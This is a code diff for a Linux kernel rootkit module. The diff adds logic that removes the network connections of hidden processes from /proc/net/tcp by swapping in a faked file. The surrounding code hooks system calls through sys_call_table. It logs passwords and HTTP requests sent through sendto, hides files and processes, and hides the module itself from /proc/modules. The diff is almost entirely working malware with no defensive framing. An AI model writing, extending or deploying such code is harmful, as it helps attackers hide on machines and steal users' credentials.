@@ -16,12 +16,14 @@
 #define BEGIN_BUF_SIZE 10000
 #define LOG_SEPARATOR "\n.............................................................\n"
 #define CMDLINE_SIZE 1000
+#define MAX_DIRENT_READ 10000
 
 //configuration
 #define FILE_SUFFIX ".rootkit"		//hiding files with names ending on defined suffix
 #define COMMAND_CONTAINS ".//./"	//hiding processes which cmdline contains defined text
 #define ROOTKIT_NAME "rootkit"		//you need to type here name of this module to make this module hidden
 
+#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
 
 DEFINE_MUTEX(log_mutex_pass);
 DEFINE_MUTEX(log_mutex_http);
@@ -49,7 +51,8 @@ asmlinkage long (*ref_sys_open) (const char __user * filename,
     int flags, umode_t mode);
 asmlinkage long (*ref_sys_stat) (const char __user * filename,
     struct __old_kernel_stat __user * statbuf);
-
+asmlinkage long (*ref_sys_readlink) (const char __user * path,
+    char __user * buf, int bufsiz);
 
 /*functions for r/w files copied from stackoverflow*/
 
@@ -59,8 +62,9 @@ struct file *file_open(const char *path, int flags, int rights)
 	mm_segment_t oldfs;
 	int err = 0;
 
-	oldfs = get_fs();
+        oldfs = get_fs();
 	set_fs(get_ds());
+
 	filp = filp_open(path, flags, rights);
 	set_fs(oldfs);
 	if (IS_ERR(filp)) {
@@ -72,7 +76,8 @@ struct file *file_open(const char *path, int flags, int rights)
 
 void file_close(struct file *file)
 {
-	filp_close(file, NULL);
+	if(file)
+	    filp_close(file, NULL);
 }
 
 int file_read(struct file *file, unsigned long long offset,
@@ -401,7 +406,6 @@ int password_found(const char *buf, size_t size)
 
 int http_header_found(const char *buf, size_t size)
 {
-	//printk(KERN_INFO "%s\n", buf);
 	if (strnstr(buf, "POST /", size))
 		return 1;
 	if (strnstr(buf, "GET /", size))
@@ -413,9 +417,6 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
     unsigned int flags, struct sockaddr __user * addr, int addr_len)
 {
 	long ret;
-
-	//printk(KERN_INFO "sendto start\n");
-
 	if (password_found(buff, len)) {
 		printk(KERN_INFO "password found\n");
 		mutex_lock(&log_mutex_pass);
@@ -432,17 +433,209 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
 
 	ret = ref_sys_sendto(fd, buff, len, flags, addr, addr_len);
 
-	//printk(KERN_DEBUG "sento end\n");
 	return ret;
 }
 
+struct inode_list{
+  long inode;
+  struct inode_list *next;
+};
+
+struct inode_list *first_inode;
+
+int	is_inode_hidden(long inode)
+{
+	struct inode_list *i_ptr =first_inode;
+	while(i_ptr)
+	{
+	  if(i_ptr->inode==inode)
+	    return 1;
+	  i_ptr=i_ptr->next;
+	}
+	return 0;
+}
+
+void make_inode_hidden(long inode){
+	struct inode_list *new_inode=NULL;
+
+	if(is_inode_hidden(inode))
+	  return;
+
+	new_inode=kmalloc(sizeof(struct inode_list),GFP_KERNEL);
+	if(new_inode==NULL)
+	  return;
+
+	new_inode->next=first_inode;
+	new_inode->inode=inode;
+	first_inode=new_inode;
+}
+
+void clean_hidden_inodes(void){
+	struct inode_list *i_ptr=first_inode;
+	struct inode_list *tmp;
+
+	while(i_ptr)
+	{
+	  tmp=i_ptr;
+	  i_ptr=i_ptr->next;
+	  kfree(tmp);
+	}
+}
+
+//copied from netstat.c (and slightly modified)
+
+#define PRG_SOCKET_PFX    "socket:["
+#define PRG_SOCKET_PFXl (strlen(PRG_SOCKET_PFX))
+
+static void extract_type_1_socket_inode(const char lname[], long * inode_p) {
+
+    /* If lname is of the form "socket:[12345]", extract the "12345"
+       as *inode_p.  Otherwise, return -1 as *inode_p.
+       */
+
+    printk(KERN_INFO "extracting %s\n",lname);
+    if (strlen(lname) < PRG_SOCKET_PFXl+3) *inode_p = -1;
+    else if (memcmp(lname, PRG_SOCKET_PFX, PRG_SOCKET_PFXl)) *inode_p = -1;
+    else if (lname[strlen(lname)-1] != ']') *inode_p = -1;
+    else {
+        char inode_str[strlen(lname + 1)];  /* e.g. "12345" */
+        const int inode_str_len = strlen(lname) - PRG_SOCKET_PFXl - 1;
+        int err;
+
+        strncpy(inode_str, lname+PRG_SOCKET_PFXl, inode_str_len);
+        inode_str[inode_str_len] = '\0';
+        err = kstrtol(inode_str,10,inode_p);
+        if (err || *inode_p < 0 || *inode_p >= INT_MAX)
+            *inode_p = -1;
+    }
+}
+
+int load_inodes_of_process(const char *name)
+{
+	char *path=NULL;
+        int path_len;
+
+	long fd;
+	long read;
+	long bpos;
+	struct linux_dirent *dirent=NULL;
+	struct linux_dirent *d;
+
+	printk(KERN_INFO "collecting descriptors of %s\n", name);
+
+	path_len=strlen("/proc/")+strlen(name)+strlen("/fd");
+	path=kmalloc(path_len+1, GFP_KERNEL);
+	if(!path)
+	  goto end;
+
+	strcpy(path,"/proc/");
+	strcat(path,name);
+	strcat(path,"/fd");
+
+	fd=ref_sys_open(path, O_RDONLY | O_DIRECTORY, 0);
+
+	dirent=kmalloc(MAX_DIRENT_READ,GFP_KERNEL);
+	if(!dirent)
+	  goto end;
+
+	//listing directory /proc/[id]/fd
+	//and then, calling readlink which returns inode of socket
+	read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);
+	if (read <= 0)
+		goto end;
+
+	for (bpos = 0; bpos < read;) {
+		d = (struct linux_dirent *)((char *)dirent + bpos);
+		if (d->d_ino != 0) {
+			if(strcmp(d->d_name,"0") && strcmp(d->d_name,"1") && strcmp(d->d_name,"2") && strcmp(d->d_name,".") && strcmp(d->d_name,".."))
+			{
+			    char lname[30];
+			    char line[40];
+			    int lnamelen;
+			    long inode;
+
+			    snprintf(line, sizeof(line), "%s/%s", path,d->d_name);
+			    lnamelen=ref_sys_readlink(line,lname,sizeof(lname)-1);
+			    if(lnamelen==-1)
+			    {
+			      bpos += d->d_reclen;
+			      continue;
+			    }
+			    lname[MIN(lnamelen,sizeof(lname)-1)] = '\0';
+			    extract_type_1_socket_inode(lname, &inode);
+			    if(inode!=-1)
+			      make_inode_hidden(inode);
+			}
+		}
+		bpos += d->d_reclen;
+	}
+
+end:
+	kfree(dirent);
+	kfree(path);
+	return 0;
+}
+
+void load_inodes_to_hide(void)
+{
+	//enum /proc
+	struct linux_dirent *dirent=NULL;
+	struct linux_dirent *d;
+	mm_segment_t old_fs;
+	long fd, read, bpos;
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+        fd=ref_sys_open("/proc", O_RDONLY | O_DIRECTORY, 0);
+	if(fd<0){
+	  return;
+	}
+
+	dirent=kmalloc(MAX_DIRENT_READ,GFP_KERNEL);
+	if(!dirent)
+	   goto end;
+
+	read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);
+	if (read <= 0)
+		goto end;
+
+        //for every process:
+        //check if this process should be hidden
+	//if so, get list of inodes of fd's, and save them for further processing
+	for (bpos = 0; bpos < read;) {
+		d = (struct linux_dirent *)((char *)dirent + bpos);
+		if (d->d_ino != 0) {
+		        //printk (KERN_INFO "process %s\n",(char *)d->d_name);
+			if (should_be_hidden((char *)d->d_name)) {
+				load_inodes_of_process((char *)d->d_name);
+			}
+		}
+		bpos += d->d_reclen;
+	}
+
+	set_fs(old_fs);
+
+end:
+	kfree(dirent);
+}
+
+char*   next_column(char *ptr)
+{
+	while(*ptr!=' ')
+	  ptr++;
+	while(*ptr==' ')
+	  ptr++;
+	return ptr;
+}
+
 //when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
+//also remove entries from /proc/net/tcp etc. of hidden processes
 asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 {
 	long ret;
 	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
 	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
-	if(rootkit_path==NULL)
+	if(!rootkit_path)
 	{
 	  ret=-1;
 	  goto end;
@@ -450,13 +643,14 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 	strcpy(rootkit_path,"/sys/module/");
 	strcat(rootkit_path,ROOTKIT_NAME);
 	if (strcmp(filename, "/proc/modules") == 0) {
-		struct file *fake_modules;
-		struct file *real_modules;
+		struct file *fake_modules=NULL;
+		struct file *real_modules=NULL;
 		mm_segment_t old_fs;
-		char *modules_buf;
+		char *modules_buf=NULL;
 		char *rootkit, *rootkit_end;
-		char *new_path;
+		char *new_path=0;
 		long res;
+		int err=0;
 
 		printk(KERN_INFO "open /proc/modules\n");
 
@@ -465,8 +659,9 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		    GFP_KERNEL);
 
 		if (!new_path){
-			ret = ref_sys_open(filename, flags, mode);
-			goto end;
+		        err=1;
+			goto end1;
+			//return ref_sys_open(filename, flags, mode);
 		}
 
 		strcpy(new_path, "/etc/modules");
@@ -475,24 +670,21 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 
 		real_modules = file_open("/proc/modules", O_RDONLY, 0);
 		if (real_modules == NULL) {
-			kfree(new_path);
-			ret = ref_sys_open(filename, flags, mode);
-			goto end;
+			err=1;
+			goto end1;
 		}
 		//open files
 		fake_modules =
 		    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
 		if (fake_modules == NULL) {
-			kfree(new_path);
-			ret = ref_sys_open(filename, flags, mode);
-			goto end;
+			err=1;
+			goto end1;
 		}
 
 		modules_buf = read_whole_file(real_modules, NULL);
 		if (modules_buf == NULL) {
-			kfree(new_path);
-			ret = ref_sys_open(filename, flags, mode);
-			goto end;
+			err=1;
+			goto end1;
 		}
 
 		//remove rootkit from modules list
@@ -509,18 +701,136 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		    file_write(fake_modules, 0, modules_buf,
 		    strlen(modules_buf));
 
+end1:
 		file_close(fake_modules);
 		file_close(real_modules);
 		kfree(modules_buf);
 
+		if(err)
+		    ret=ref_sys_open(filename, flags, mode);
+		else{
+		    //http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
+		    old_fs = get_fs();
+		    set_fs(KERNEL_DS);
+		    //redirect open("/proc/modules") to fake file
+		    ret = ref_sys_open(new_path, flags, mode);
+		    set_fs(old_fs);
+		}
+		kfree(new_path);
+	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
+		ret=-ENOENT;
+	} else if (strcmp(filename, "/proc/net/tcp") == 0) {
+		struct file *fake_net=NULL;
+		struct file *real_net=NULL;
+		mm_segment_t old_fs;
+		char *net_buf=NULL;
+		char *new_path=NULL;
+		long res;
+		int err=0;
+		char *line_ptr;
+
+		load_inodes_to_hide();
+
+		new_path =
+		    kzalloc(strlen("/etc/net") + strlen(FILE_SUFFIX) + 1,
+		    GFP_KERNEL);
+
+		if (!new_path){
+		        err=1;
+			goto end2;
+		}
+
+		strcpy(new_path, "/etc/net");
+		strcat(new_path, FILE_SUFFIX);
+
+
+		real_net = file_open("/proc/net/tcp", O_RDONLY, 0);
+		if (real_net == NULL) {
+			err=1;
+			goto end2;
+		}
+		//open files
+		fake_net=file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
+		if (fake_net == NULL) {
+			err=1;
+			goto end2;
+		}
+
+		net_buf = read_whole_file(real_net, NULL);
+		if (net_buf == NULL) {
+			err=1;
+			goto end2;
+		}
+
+		//parse every line, extract inode, check if inode belongs to hidden process, if so, remove this line from file
+		line_ptr=strchr(net_buf,'\n');
+		while(line_ptr && *(line_ptr+1))
+		{
+		   int i;
+		   char *column, *space;
+		   long inode;
+		   int err;
+
+		   if(*line_ptr==0)
+		     break;
+
+		   column=line_ptr+1;
+		   for(i=0;i<10;i++)
+		     column=next_column(column);
+
+		   space=strchr(column,' ');
+		   if(!space)
+		   {//strange, file is not in proper format
+		     break;
+		   }
+		   *space=0;
+		   err=kstrtol(column, 10, &inode);
+		   *space=' ';
+		   if(err)
+		     break;
+
+		   if(is_inode_hidden(inode))
+		   {
+		      //if this connection belongs to hidden process, hide this connection by removing this line
+		      char *destination=line_ptr+1;
+		      char *source=strchr(line_ptr+1,'\n')+1;
+		      int size=strlen(net_buf)-(source-net_buf)+1;
+		      if(size==0)
+		      {
+			*destination=0;
+			continue;
+		      }
+
+		      memcpy(destination,source,size);
+		      continue;
+		   }
+
+		   line_ptr=strchr(line_ptr+1,'\n');
+		}
+
+		res =
+		    file_write(fake_net, 0, net_buf,
+		    strlen(net_buf));
+
+end2:
+		file_close(fake_net);
+		file_close(real_net);
+		kfree(net_buf);
+
+		if(err)
+		   ret=ref_sys_open(filename, flags, mode);
+		else{
 		//http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
-		old_fs = get_fs();
-		set_fs(KERNEL_DS);
-		//redirect open("/proc/modules") to fake file
-		ret = ref_sys_open(new_path, flags, mode);
-		set_fs(old_fs);
+		  old_fs = get_fs();
+		  set_fs(KERNEL_DS);
+		  //redirect open to fake file
+		  ret = ref_sys_open(new_path, flags, mode);
+		  set_fs(old_fs);
+		}
 
 		kfree(new_path);
+
+
 	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
 		ret=-ENOENT;
 	} else {
@@ -538,6 +848,11 @@ asmlinkage long new_sys_stat (const char __user * filename,
 	long ret;
 	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
 	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
+	if(!rootkit_path){
+	  ret = ref_sys_stat(filename, statbuf);
+	  goto end;
+	}
+
 	strcpy(rootkit_path,"/sys/module/");
 	strcat(rootkit_path,ROOTKIT_NAME);
 	if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
@@ -545,6 +860,7 @@ asmlinkage long new_sys_stat (const char __user * filename,
 	} else {
 		ret = ref_sys_stat(filename, statbuf);
 	}
+end:
 	kfree(rootkit_path);
 	return ret;
 }
@@ -630,6 +946,8 @@ static int __init rootkit_start(void)
 	register (open);
 	register (stat);
 
+	ref_sys_readlink = (void *)sys_call_table[__NR_readlink];
+
 	write_cr0(original_cr0);
 
 	return 0;
@@ -651,6 +969,7 @@ static void __exit rootkit_end(void)
 
 	write_cr0(original_cr0);
 
+	clean_hidden_inodes();
 	msleep(2000);
 }
 
